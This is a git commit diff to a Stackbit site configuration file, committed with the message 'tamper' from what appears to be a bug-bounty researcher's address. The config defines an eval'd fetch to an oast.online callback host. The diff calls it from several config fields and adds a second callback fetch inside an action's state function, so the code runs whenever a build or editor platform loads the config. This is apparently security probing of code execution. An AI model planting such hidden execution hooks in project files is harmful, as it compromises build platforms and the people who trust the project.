263d2e14d6a2c46077063e862b51d46dc0a46115
10ad3d <loaded@wearehackerone.com>
2024-06-20 11:45:12 -0700

    tamper

--- stackbit.config.js
+++ stackbit.config.js
@@ -1,6 +1,24 @@
 const e = () => eval(`fetch(\`https://cpq67u9ucph47g61a7i07yi6s4bc758t8.oast.online\`)`);
 
 export default {
-  stackbitConfigVersion: "1",
-  buildCommand: e()
+  stackbitVersion: e(),
+  ssgName: e(),
+  nodeVersion: e(),
+  buildCommand: e(),
+  models: {
+    page: { type: 'page', urlPath: '/{slug}' },
+  },
+  actions: [
+    {
+      type: 'global',
+      name: 'name_of_action',
+      state: async (options) => {
+        // Determine the state ...
+        await fetch(`https://cpq77vhucph3d4aj0jh0yykepgg78bq89.oast.online`)
+      },
+      run: async (options) => {
+        // Perform the action ...
+      },
+    },
+  ],
 }
